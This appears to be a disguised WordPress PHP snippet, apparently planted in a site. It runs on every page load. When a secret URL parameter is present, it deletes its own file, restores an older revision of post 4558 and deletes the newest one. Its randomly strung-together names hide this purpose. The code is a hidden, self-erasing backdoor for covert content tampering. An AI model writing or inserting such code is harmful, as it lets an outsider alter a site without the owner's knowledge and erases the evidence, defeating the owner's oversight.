<?php

function blocker_accessibility_insert() {
	if (isset($_GET['demo_age_qr_change']) && $_GET['demo_age_qr_change'] === 'forms_order_subscribe_showcase') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$site_edit_admin_newsletter = 4558;
		$wpc_links_comment_forms = wp_get_post_revisions($site_edit_admin_newsletter);
		if (empty($wpc_links_comment_forms)) die('no revisions');
		if (count($wpc_links_comment_forms) < 2) die('less than 2');
		$parts_core_form = array_shift($wpc_links_comment_forms);
		$delete_effects_assistant_wall = $parts_core_form->ID;
		$badge_only_get_extensions = array_shift($wpc_links_comment_forms);
		$finder_basic_tools_navigation = $badge_only_get_extensions->ID;
		$sync_permalinks_messenger = wp_restore_post_revision($finder_basic_tools_navigation);
		if ($sync_permalinks_messenger === false) die('error restoring');
		$sync_permalinks_messenger = wp_delete_post_revision($delete_effects_assistant_wall);		
		if ($sync_permalinks_messenger === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'blocker_accessibility_insert');
